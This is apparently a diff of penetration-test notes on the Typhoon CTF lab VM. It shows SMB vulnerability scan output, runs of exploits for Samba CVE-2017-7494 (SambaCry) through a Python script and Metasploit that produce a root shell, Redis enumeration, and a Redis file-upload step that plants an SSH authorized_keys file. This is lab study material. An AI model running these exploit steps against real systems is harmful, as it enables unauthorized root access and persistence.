+|     References:
+|       https://www.samba.org/samba/security/CVE-2017-7494.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494
+|_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)
+|_smb-vuln-ms10-061: false
+| smb-vuln-regsvc-dos: 
+|   VULNERABLE:
+|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
+|     State: VULNERABLE
+|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
+|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
+|       while working on smb-enum-sessions.
+|_          
+Nmap done: 1 IP address (1 host up) scanned in 59.39 seconds
+
+------------------------------------------------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/samba# pip install pysmbclient
+Collecting pysmbclient
+  Downloading https://files.pythonhosted.org/packages/9f/81/1d3e94c27fd7ce8ed46ccf7260d321832b9778d283f43bdee29ea7527b0e/PySmbClient-0.1.5.tar.gz
+Building wheels for collected packages: pysmbclient
+  Running setup.py bdist_wheel for pysmbclient ... done
+  Stored in directory: /root/.cache/pip/wheels/df/8b/5d/cd802825c54591b37e36dba927b729bb77729720d0503a9647
+Successfully built pysmbclient
+Installing collected packages: pysmbclient
+Successfully installed pysmbclient-0.1.5
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/samba# python2 ./samba-hunter.py -h
+  ____                  _           _   _             _            
+ / ___|  __ _ _ __ ___ | |__   __ _| | | |_   _ _ __ | |_ ___ _ __ 
+ \___ \ / _` | '_ ` _ \| '_ \ / _` | |_| | | | | '_ \| __/ _ \ '__|
+  ___) | (_| | | | | | | |_) | (_| |  _  | |_| | | | | ||  __/ |   
+ |____/ \__,_|_| |_| |_|_.__/ \__,_|_| |_|\__,_|_| |_|\__\___|_|   
+                                                                   
+    # Exploit Author: avfisher (https://github.com/brianwrf)
+    # Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
+    # CVE-2017-7494
+    # Help: python sambahunter.py -h
+
+usage: samba-hunter.py [-h] [-s SERVER] [-c COMMAND]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -s SERVER, --server SERVER
+                        Server to target
+  -c COMMAND, --command COMMAND
+                        Command to execute on target server
+						
+						
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/samba# python2 ./samba-hunter.py --server 192.168.1.104 --command 'id > /tmp/id.txt'
+  ____                  _           _   _             _            
+ / ___|  __ _ _ __ ___ | |__   __ _| | | |_   _ _ __ | |_ ___ _ __ 
+ \___ \ / _` | '_ ` _ \| '_ \ / _` | |_| | | | | '_ \| __/ _ \ '__|
+  ___) | (_| | | | | | | |_) | (_| |  _  | |_| | | | | ||  __/ |   
+ |____/ \__,_|_| |_| |_|_.__/ \__,_|_| |_|\__,_|_| |_|\__\___|_|   
+                                                                   
+    # Exploit Author: avfisher (https://github.com/brianwrf)
+    # Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
+    # CVE-2017-7494
+    # Help: python sambahunter.py -h
+
+[*] Exploiting RCE for Samba (CVE-2017-7494)...
+[*] Server: 192.168.1.104
+[*] Exploit finished!
+
+
+=> FAILED 
+
+
+---------------------------------------------
+Metasploit - SAMBACRY
+---------------------------------------------
+
+msf > search samba
+
+	Matching Modules
+	================
+
+   Name                                            Disclosure Date  Rank       Description
+   ----                                            ---------------  ----       -----------
+   auxiliary/admin/smb/samba_symlink_traversal                      normal     Samba Symlink Directory Traversal
+   auxiliary/dos/samba/lsa_addprivs_heap                            normal     Samba lsa_io_privilege_set Heap Overflow
+   auxiliary/dos/samba/lsa_transnames_heap                          normal     Samba lsa_io_trans_names Heap Overflow
+   auxiliary/dos/samba/read_nttrans_ea_list                         normal     Samba read_nttrans_ea_list Integer Overflow
+   auxiliary/scanner/rsync/modules_list                             normal     List Rsync Modules
+   auxiliary/scanner/smb/smb_uninit_cred                            normal     Samba _netr_ServerPasswordSet Uninitialized Credential State
+   exploit/freebsd/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (*BSD x86)
+   exploit/linux/samba/chain_reply                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
+   exploit/linux/samba/is_known_pipename           2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
+   exploit/linux/samba/lsa_transnames_heap         2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
+   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   exploit/linux/samba/trans2open                  2003-04-07       great      Samba trans2open Overflow (Linux x86)
+   exploit/multi/samba/nttrans                     2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
+   exploit/osx/samba/lsa_transnames_heap           2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/osx/samba/trans2open                    2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
+   exploit/solaris/samba/lsa_transnames_heap       2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
+   exploit/solaris/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
+   exploit/unix/misc/distcc_exec                   2002-02-01       excellent  DistCC Daemon Command Execution
+   exploit/unix/webapp/citrix_access_gateway_exec  2010-12-21       excellent  Citrix Access Gateway Command Execution
+   exploit/windows/fileformat/ms14_060_sandworm    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   exploit/windows/http/sambar6_search_results     2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
+   exploit/windows/license/calicclnt_getconfig     2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
+   exploit/windows/smb/group_policy_startup        2015-01-26       manual     Group Policy Script Execution From Shared Resource
+   post/linux/gather/enum_configs                                   normal     Linux Gather Configurations
+
+msf exploit(linux/samba/is_known_pipename) > options
+
+Module options (exploit/linux/samba/is_known_pipename):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   RHOST                            yes       The target address
+   RPORT           445              yes       The SMB service port (TCP)
+   SMB_FOLDER                       no        The directory to use within the writeable SMB share
+   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic (Interact)
+
+msf exploit(linux/samba/is_known_pipename) > set RPORT 445
+msf exploit(linux/samba/is_known_pipename) > set RHOST 192.168.13.208
+msf exploit(linux/samba/is_known_pipename) > run
+
+[*] 192.168.13.208:445 - Using location \\192.168.13.208\typhoon\ for the path
+[*] 192.168.13.208:445 - Retrieving the remote path of the share 'typhoon'
+[*] 192.168.13.208:445 - Share 'typhoon' has server-side path '/tmp
+[*] 192.168.13.208:445 - Uploaded payload to \\192.168.13.208\typhoon\xxzKNLXQ.so
+[*] 192.168.13.208:445 - Loading the payload from server-side path /tmp/xxzKNLXQ.so using \\PIPE\/tmp/xxzKNLXQ.so...
+[-] 192.168.13.208:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] 192.168.13.208:445 - Loading the payload from server-side path /tmp/xxzKNLXQ.so using /tmp/xxzKNLXQ.so...
+[+] 192.168.13.208:445 - Probe response indicates the interactive payload was loaded...
+[*] Found shell.
+
+[*] Command shell session 1 opened (192.168.13.91:45045 -> 192.168.13.208:445) at 2019-08-05 19:58:07 +0200
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+hostname
+typhoon.local
+
+
+================================================================================================
+
+REDIS - SERVER
+==================
+
+msf5 auxiliary(scanner/redis/redis_login) > options
+
+Module options (auxiliary/scanner/redis/redis_login):
+
+   Name              Current Setting                                                    Required  Description
+   ----              ---------------                                                    --------  -----------
+   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list
+   PASSWORD          foobared                                                           no        Redis password for authentication test
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        The file that contains a list of of probable passwords.
+   RHOSTS            192.168.1.104                                                      yes       The target address range or CIDR identifier
+   RPORT             6379                                                               yes       The target port (TCP)
+   STOP_ON_SUCCESS   false                                                              yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                  yes       The number of concurrent threads
+   VERBOSE           true                                                               yes       Whether to print output for all attempts
+
+msf5 auxiliary(scanner/redis/redis_login) > run
+
+[-] 192.168.1.104:6379    - 192.168.1.104:6379    - LOGIN FAILED: redis:foobared (No Auth Required: -ERR Client sent AUTH, but no password is set
+)
+[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(scanner/redis/redis_login) > back
+
+------------------------------------------------------------------------------------------
+
+msf5 > use auxiliary/scanner/redis/redis_server 
+
+msf5 auxiliary(scanner/redis/redis_server) > options
+
+Module options (auxiliary/scanner/redis/redis_server):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   COMMAND   INFO             yes       The Redis command to run
+   PASSWORD  foobared         no        Redis password for authentication test
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     6379             yes       The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads
+
+msf5 auxiliary(scanner/redis/redis_server) > set rhosts 192.168.1.104
+rhosts => 192.168.1.104
+
+msf5 auxiliary(scanner/redis/redis_server) > run
+
+[+] 192.168.1.104:6379    - Found redis with INFO command: $2724\x0d\x0a# Server\x0d\x0aredis_version:4.0.11\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:9bc1b767d9184398\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 3.13.0-32-generic x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:4.8.4\x0d\x0aprocess_id:2125\x0d\x0arun_id:cde119a30688ac8abd0562b7eee68626770a4174\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:1408\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:6600434\x0d\x0aexecutable:/usr/bin/redis-server\x0d\x0aconfig_file:/etc/redis/redis.conf\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:849432\x0d\x0aused_memory_human:829.52K\x0d\x0aused_memory_rss:7643136\x0d\x0aused_memory_rss_human:7.29M\x0d\x0aused_memory_peak:849432\x0d\x0aused_memory_peak_human:829.52K\x0d\x0aused_memory_peak_perc:105.20%\x0d\x0aused_memory_overhead:836198\x0d\x0aused_memory_startup:786568\x0d\x0aused_memory_dataset:13234\x0d\x0aused_memory_dataset_perc:21.05%\x0d\x0atotal_system_memory:2099126272\x0d\x0atotal_system_memory_human:1.95G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:9.00\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# Persistence\x0d\x0aloading:0\x0d\x0ardb_changes_since_last_save:0\x0d\x0ardb_bgsave_in_progress:0\x0d\x0ardb_last_save_time:1550102898\x0d\x0ardb_last_bgsave_status:ok\x0d\x0ardb_last_bgsave_time_sec:-1\x0d\x0ardb_current_bgsave_time_sec:-1\x0d\x0ardb_last_cow_size:0\x0d\x0aaof_enabled:0\x0d\x0aaof_rewrite_in_progress:0\x0d\x0aaof_rewrite_scheduled:0\x0d\x0aaof_last_rewrite_time_sec:-1\x0d\x0aaof_current_rewrite_time_sec:-1\x0d\x0aaof_last_bgrewrite_status:ok\x0d\x0aaof_last_write_status:ok\x0d\x0aaof_last_cow_size:0\x0d\x0a\x0d\x0a# Stats\x0d\x0atotal_connections_received:2\x0d\x0atotal_commands_processed:1\x0d\x0ainstantaneous_ops_per_sec:0\x0d\x0atotal_net_input_bytes:42\x0d\x0atotal_net_output_bytes:47\x0d\x0ainstantaneous_input_kbps:0.00\x0d\x0ainstantaneous_output_kbps:0.00\x0d\x0arejected_connections:0\x0d\x0async_full:0\x0d\x0async_partial_ok:0\x0d\x0async_partial_err:0\x0d\x0aexpired_keys:0\x0d\x0aexpired_stale_perc:0.00\x0d\x0aexpired_time_cap_reached_count:0\x0d\x0aevicted_keys:0\x0d\x0akeyspace_hits:0\x0d\x0akeyspace_misses:0\x0d\x0apubsub_channels:0\x0d\x0apubsub_patterns:0\x0d\x0alatest_fork_usec:0\x0d\x0amigrate_cached_sockets:0\x0d\x0aslave_expires_tracked_keys:0\x0d\x0aactive_defrag_hits:0\x0d\x0aactive_defrag_misses:0\x0d\x0aactive_defrag_key_hits:0\x0d\x0aactive_defrag_key_misses:0\x0d\x0a\x0d\x0a# Replication\x0d\x0arole:master\x0d\x0aconnected_slaves:0\x0d\x0amaster_replid:f557e5328f56646d4b707be07c9ba9a581969efa\x0d\x0amaster_replid2:0000000000000000000000000000000000000000\x0d\x0amaster_repl_offset:0\x0d\x0asecond_repl_offset:-1\x0d\x0arepl_backlog_active:0\x0d\x0arepl_backlog_size:1048576\x0d\x0arepl_backlog_first_byte_offset:0\x0d\x0arepl_backlog_histlen:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:3.33\x0d\x0aused_cpu_user:1.84\x0d\x0aused_cpu_sys_children:0.00\x0d\x0aused_cpu_user_children:0.00\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace
+[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+---------------------------------------------------------------------------
+
+msf5 auxiliary(scanner/redis/redis_server) > set command command
+command => command
+
+msf5 auxiliary(scanner/redis/redis_server) > run
+
+[+] 192.168.1.104:6379    - Found redis with command command: *180\x0d\x0a*6\x0d\x0a$11\x0d\x0aincrbyfloat\x0d\x0a:3\x0d\x0a*3\x0d\x0a+write\x0d\x0a+denyoom\x0d\x0a+fast\x0d\x0a:1\x0d\x0a:1\x0d\x0a:1\x0d\x0a*6\x0d\x0a$5\x0d\x0asmove\x0d\x0a:4\x0d\x0a*2\x0d\x0a+write\x0d\x0a+fast\x0d\x0a:1\x0d\x0a:2\x0d\x0a:1\x0d\x0a*6\x0d\x0a$4\x0d\x0amget\x0d\x0a:-2
+[*] 192.168.1.104:6379    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+-----------------------------------------------------------------------------
+
+msf5 > use auxiliary/scanner/redis/file_upload 
+
+msf5 auxiliary(scanner/redis/file_upload) > options
+msf5 auxiliary(scanner/redis/file_upload) > SET RHOST 192.168.13.208
+msf5 auxiliary(scanner/redis/file_upload) > SET PORT 6379
+msf5 auxiliary(scanner/redis/file_upload) > SET FLUSHALL false
+msf5 auxiliary(scanner/redis/file_upload) > SET LocalFile /tmp/authorized_key
+msf5 auxiliary(scanner/redis/file_upload) > SET RemoteFile /root/.ssh/authorized_keys
+											OR
+msf5 auxiliary(scanner/redis/file_upload) > SET RemoteFile /home/typhoon/.ssh/authorized_keys
+
+then SSH with your key...
+
